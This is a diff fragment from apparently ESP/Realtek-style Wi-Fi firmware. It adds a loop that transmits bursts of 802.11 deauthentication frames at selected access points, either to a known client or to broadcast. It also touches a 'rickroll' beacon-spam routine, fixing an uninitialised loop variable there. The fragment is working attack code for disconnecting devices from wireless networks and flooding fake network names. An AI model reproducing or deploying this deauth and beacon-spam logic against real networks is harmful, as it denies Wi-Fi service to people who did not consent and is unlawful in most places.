+    wext_set_channel(WLAN0_NAME, t->ch);
+    const uint8_t* dst = t->have_client ? t->client : bcast;
+    digitalWrite(LED_R, HIGH);
+    for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
+      wifi_tx_deauth_frame(t->bssid, (void *)dst, deauth_reason);
+      delay(5);
+    }
+    digitalWrite(LED_R, LOW);
+    dauth_idx = (dauth_idx + 1) % dauth_n;
+    delay(50);
+  }
+
   if (deauth_wifis.size() > 0) {
     memcpy(deauth_bssid, scan_results[deauth_wifis[current_num]].bssid, 6);
     wext_set_channel(WLAN0_NAME, scan_results[deauth_wifis[current_num]].channel);
@@ -668,7 +1245,7 @@ void loop() {
   }
   if (rickroll){
     digitalWrite(LED_G, !digitalRead(LED_G));
-    for (int v; v < 8; v++){
+    for (int v = 0; v < 8; v++){   // FIX: was `for (int v; ...)` — v uninitialized (UB)
       String ssid2 = rick_roll[v];
       for(int i=0;i<7;i++){
         byte randomByte = random(0x00, 0xFF);
